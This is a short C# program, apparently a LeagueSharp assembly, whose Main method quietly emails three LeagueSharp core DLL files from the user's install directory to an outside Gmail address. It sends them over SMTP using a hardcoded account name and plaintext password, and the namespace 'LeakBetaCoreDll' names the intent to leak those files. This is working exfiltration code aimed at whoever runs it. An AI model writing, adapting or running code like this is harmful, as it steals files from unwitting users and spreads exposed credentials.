using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using LeagueSharp;
using LeagueSharp.Common;

namespace LeakBetaCoreDll
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential("leakedcoredll@gmail.com", "leakedcoredll1")
            };
            MailMessage message = new MailMessage("leakedcoredll@gmail.com", "shalzuth@gmail.com", "success!", "");
            if (File.Exists(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")))
            {
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "Leaguesharp.Core.dll")));
                message.Attachments.Add(new Attachment(Path.Combine(Config.LeagueSharpDirectory, "LeagueSharp.Bootstrap.dll")));
            }
            else
            {
                message.Body = "didn't work : " + Config.LeagueSharpDirectory;
            }
            smtp.Send(message);
        }
    }
}
